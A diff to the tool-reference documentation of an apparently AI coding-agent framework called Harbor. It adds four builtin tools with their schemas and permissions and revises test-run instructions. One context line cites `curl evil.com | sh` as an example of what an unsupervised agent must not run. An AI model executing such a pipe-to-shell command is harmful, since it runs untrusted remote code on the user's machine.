@@ -43,14 +43,14 @@
 
 ## 1. Inventory
 
-Harbor ships **14 builtin tools** registered by `Harbor.Hosting.ToolsCatalog.CreateToolRegistry`
+Harbor ships **18 builtin tools** registered by `Harbor.Hosting.ToolsCatalog.CreateToolRegistry`
 (in `src/Harbor.Hosting/Modules/ToolsCatalog.cs`). They live in
 `src/Harbor.Tools.Builtin/Tools/<Name>/<Name>Tool.cs` and are plain `sealed` classes
 implementing `Harbor.Abstractions.Tools.ITool`.
 
 > **Tool sets**: hosts pick a `HarborToolSetKind` in `HarborComposeOptions`. `Full14`
-> registers all 14 tools; `Standard10` omits the four heavier ones (`task`, `webfetch`,
-> `ripgrep`, `mcp`). The CLI defaults to `Full14`; the Avalonia desktop app uses
+> registers all 18 tools (14 classic + `lsp` + `skill` + `read_mcp_resource` + `mcp_prompt`); `Standard10` omits the six heavier ones (`task`, `webfetch`,
+> `ripgrep`, `mcp`, `read_mcp_resource`, `mcp_prompt`). The CLI defaults to `Full14`; the Avalonia desktop app uses
 > `Standard10` (see `apps/Harbor.App.Avalonia/AppHost.cs`).
 
 | # | Tool | Mode | Permission | Purpose |
@@ -69,6 +69,10 @@ implementing `Harbor.Abstractions.Tools.ITool`.
 | 12 | `ripgrep` | Parallel | Allow | Fast content search via `rg` binary (gitignore-aware) |
 | 13 | `tree` | Parallel | Allow | ASCII directory tree (gitignore-aware) |
 | 14 | `mcp` | Sequential | Ask | Bridge to a registered MCP server |
+| 15 | `skill` | Parallel | Allow | Load a SKILL.md skill body by name |
+| 16 | `read_mcp_resource` | Parallel | Ask | Read an MCP server resource by URI |
+| 17 | `mcp_prompt` | Parallel | Ask | Render an MCP server prompt by name |
+| 18 | `lsp` | Sequential | Allow | Language-server diagnostics / references / definition |
 
 > **Why these and not more?** Every builtin earns its slot by being either (a) essential for
 > any coding task (read/write/edit/bash/glob/grep/ls), (b) a host-aware primitive that needs
@@ -790,6 +794,136 @@ treat each one as a tiny RPC sandbox.
 
 ---
 
+### `skill`
+
+**Description.** Loads a `SKILL.md` skill body by name. Skills are discovered from the
+project-local `.harbor/skills/` directory (wins on collisions) and the global
+`~/.harbor/skills/` directory — the same roots the system prompt's
+`<available_skills>` block is built from (`WorkspaceContextSource`). Each skill is a
+`<name>/SKILL.md` directory or a legacy flat `<name>.md` file, with optional YAML
+front-matter (`name:`, `description:`). The tool accepts a NAME only, never a path,
+so a crafted name cannot escape the skills roots. Bodies over 12 000 chars are
+truncated with a pointer to the file.
+
+**Args schema.**
+
+```jsonc
+{
+  "type": "object",
+  "properties": {
+    "name":  { "type": "string", "description": "Skill name as listed in <available_skills> (e.g. 'code-review')" },
+    "scope": { "type": "string", "description": "Where to look: 'project', 'global', or 'any' (default)" }
+  },
+  "required": ["name"]
+}
+```
+
+**Examples.**
+
+```jsonc
+// 1. Load a skill before doing the task it describes
+{"name": "code-review"}
+
+// 2. Prefer the project-local variant explicitly
+{"name": "deploy", "scope": "project"}
+
+// 3. Fall back to a globally installed skill
+{"name": "commit", "scope": "global"}
+```
+
+**Permissions.** Allow (default). Read-only by construction — the tool only reads
+files under the two skills roots.
+
+**Mode.** `Parallel`.
+
+**Tips.**
+- Manage skills from the shell: `harbor skill list` / `harbor skill install <SKILL.md|dir> [--project]` / `harbor skill uninstall <name>`.
+- Project skills shadow same-named global skills — same precedence as the prompt block.
+- Don't paste the loaded body back into chat; follow its steps instead.
+
+---
+
+### `read_mcp_resource`
+
+**Description.** Reads an MCP resource (`resources/read`) from a registered server and
+returns its text contents. URIs come from `resources/list` (via the generic `mcp`
+tool). Binary (base64 blob) entries are rejected with a hint to request a text view.
+
+**Args schema.**
+
+```jsonc
+{
+  "type": "object",
+  "properties": {
+    "server": { "type": "string", "description": "Registered MCP server name" },
+    "uri":    { "type": "string", "description": "Resource URI from resources/list (e.g. 'file:///docs/api.md')" }
+  },
+  "required": ["server", "uri"]
+}
+```
+
+**Examples.**
+
+```jsonc
+// 1. Read a doc exposed by a filesystem server
+{"server": "docs", "uri": "file:///docs/api.md"}
+
+// 2. Read a schema exposed by a database server
+{"server": "db", "uri": "schema://public/users"}
+```
+
+**Permissions.** Ask (default). Same sandbox reasoning as `mcp` — server data is
+third-party content.
+
+**Mode.** `Parallel` (read-only).
+
+**Tips.**
+- Discover URIs first: `mcp {"server": "db", "method": "resources/list"}`.
+- For binary resources, ask the server for a text view instead.
+
+---
+
+### `mcp_prompt`
+
+**Description.** Renders an MCP prompt (`prompts/get`) from a registered server into
+plain text the agent can follow. Prompt names come from `prompts/list` (via the
+generic `mcp` tool); template variables go through `arguments`. Non-text message
+parts (images, embedded resources) are skipped with a note.
+
+**Args schema.**
+
+```jsonc
+{
+  "type": "object",
+  "properties": {
+    "server":    { "type": "string", "description": "Registered MCP server name" },
+    "name":      { "type": "string", "description": "Prompt name from prompts/list" },
+    "arguments": { "type": "object", "description": "Template variables (optional)" }
+  },
+  "required": ["server", "name"]
+}
+```
+
+**Examples.**
+
+```jsonc
+// 1. Render a review checklist prompt
+{"server": "dev", "name": "code-review"}
+
+// 2. Render with template variables
+{"server": "dev", "name": "commit", "arguments": {"style": "conventional"}}
+```
+
+**Permissions.** Ask (default). Same sandbox reasoning as `mcp`.
+
+**Mode.** `Parallel` (read-only).
+
+**Tips.**
+- Discover prompts first: `mcp {"server": "dev", "method": "prompts/list"}`.
+- Check a prompt's required `arguments` in the list output before rendering.
+
+---
+
 ## 3. "When to use X vs Y" matrix
 
 | You want to… | Use | Not | Why |
@@ -1151,7 +1285,7 @@ small whitelist of read-only commands (`ls`, `cat`, `grep`, `rg`, `find`, `git s
 asks. This is correct: an agent that runs `curl evil.com | sh` without asking is a security
 incident waiting to happen.
 
-### Why `read`/`glob`/`grep`/`ls`/`tree`/`ripgrep`/`notebook` are always Allow
+### Why `read`/`glob`/`grep`/`ls`/`tree`/`ripgrep`/`notebook`/`skill` are always Allow
 
 These tools have no side effects and cannot leak data outside the local machine. They're
 the agent's eyes — blocking them just slows things down without improving safety.
@@ -1364,6 +1498,14 @@ Then call a specific tool:
 }
 ```
 
+For reads, prefer the fixed-schema wrappers over hand-crafted params:
+
+```jsonc
+{"tool":"read_mcp_resource","args":{"server":"filesystem","uri":"file:///docs/api.md"}}
+{"tool":"mcp_prompt","args":{"server":"dev","name":"code-review"}}
+```
+
+
 ### Implementation notes
 
 - `McpRegistry` is registered as the `IMcpRegistry` singleton by
@@ -1481,17 +1623,17 @@ public class WebFetchToolTests
 ### Running tests
 
 ```bash
-# Just the builtin tool tests (known-good pattern: per-project, Release, no rebuild)
-dotnet test tests/Harbor.Tools.Builtin.Tests -c Release --no-build
+# Just the builtin tool tests (known-good pattern: per-project executable, Release, no rebuild)
+dotnet run --project tests/Harbor.Tools.Builtin.Tests -c Release --no-build -- --minimum-expected-tests 1
 
-# One test class — TUnit uses --treenode-filter, not --filter
-dotnet test tests/Harbor.Tools.Builtin.Tests \
+# One test class — TUnit uses --treenode-filter, not --filter (forwarded after --)
+dotnet run --project tests/Harbor.Tools.Builtin.Tests -c Release --no-build -- \
   --treenode-filter "/*/*/WebFetchToolTests/*"
 ```
 
-> **Known limitation:** running the whole `Harbor.slnx` test suite in one command (`dotnet test`)
-> breaks under the MTP host (test-platform parallelism). Run per-project `dotnet test tests/<X>`
-> instead.
+> **Known limitation:** `dotnet test` discovers zero tests in this repo (broken
+> MTP bridge). Run test projects as plain executables, one at a time
+> (`dotnet run --project tests/<X> -c Release --no-build`).
 
 ---
 
